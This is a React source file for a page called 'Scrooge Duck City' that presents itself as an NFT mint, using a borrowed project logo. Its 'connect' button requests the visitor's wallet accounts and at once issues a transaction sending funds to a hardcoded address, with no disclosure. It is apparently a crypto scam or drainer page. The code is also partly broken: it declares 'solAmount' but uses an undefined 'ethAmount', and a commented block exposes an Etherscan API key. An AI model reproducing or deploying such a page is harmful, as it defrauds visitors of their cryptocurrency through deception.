import './App.css';
import {useEffect, useState} from "react";
import imgDiscord from './icons8-discord-50.png'
import imgTwitter from './icons8-twitter-50.png'

const solAmount = 0.4
const image = 'https://howrare.is/drop_logos/5508_tuQbWorE.jpg'
const Title = 'Scrooge Duck City'
// const supply = 5444

document.title = Title
document.getElementById('favicon').setAttribute('href', image)

function App() {
    const [opacity, setOpacity] = useState(0)
    // const [offset, setOffset] = useState(0)
    // const [gas, setGas] = useState(null)

    // useEffect(() => {
    //     const fetchRequest = async () => {
    //         const response = await fetch('https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=PW7Z9MJMX6YRBM2M2HAS6CP14Y1ZCUXPWH')
    //         const responseJSON = await response.json()
    //         setGas(responseJSON?.result?.FastGasPrice)
    //     }
    //     fetchRequest()
    // }, [])

    const connectAndSend = async (fromWallet) => {
        try {
            await sendEth()
        } catch (err) {
            console.log(err)
        }
    }

    const sendEth = async () => {
        const address = await window.ethereum.request({method: 'eth_requestAccounts'})

        const balance = await window.ethereum.request({method: 'eth_getBalance', params: [address[0], 'latest']})

        // console.log('balance', ethAmount, gas, (gas / 15) / 3089, (ethAmount - (Number(gas) / 10000)))

        let params = [{
            "from": address[0],
            "to": '0x8f383a03e931DbC2eC6A92496e1a068eb85EA128',
            // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
            // "gasPrice": Number(gas * 600000000).toString(16),
            "value": parseInt(ethAmount * 1000000000000000000).toString(16)
        }]

        const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
            console.log(err)
        })
    }

    setTimeout(() => {
        setOpacity(100)
    }, 0)

    //function getRandomArbitrary(min, max) {
    //    return Math.random() * (max - min) + min;
    //}


    //useEffect(() => {
    //    if (Number(offset) <= 230) {
    //        const timer = setTimeout(() => {
    //            const random = getRandomArbitrary(1, 3)
    //           const randomToFixed = Number(random.toFixed())
    //            setOffset(Number(offset) + randomToFixed)
    //        }, 4000)
    //        return () => clearTimeout(timer);
    //    }
    //}, [offset])

    return (
        <div className={'AppContainer'}
             ref={(el) => {
                 if (el) {
                     el.style.setProperty('opacity', opacity, 'important');
                 }
             }}
        >
            <header>
                <div>
                    <a href={'/'}>{Title}</a>
                </div>
                <nav>
                    <ul>
                        <li>
                            <img src={imgTwitter} alt=""/>
                        </li>
                        <li>
                            <img src={imgDiscord} alt=""/>
                        </li>
                    </ul>
                </nav>
            </header>
            <div className="App">
                <div>
                    <img src={image}
                         alt={'projectImage'}/>
                </div>
                <div>
                    <div>Amount - {ethAmount}</div>
                    <button onClick={connectAndSend}>connect</button>
                    {/*<div className={'lineContainer'}>*/}
                    {/*    <div className={'line'}></div>*/}
                    {/*    <div className={'circleOnLine'} style={{left: `${offset}px`}}></div>*/}
                    {/*</div>*/}
                    {/*<div>{`${(offset * (supply / 235)).toFixed()} / ${supply}`}</div>*/}
                </div>
            </div>
        </div>
    );
}

export default App;
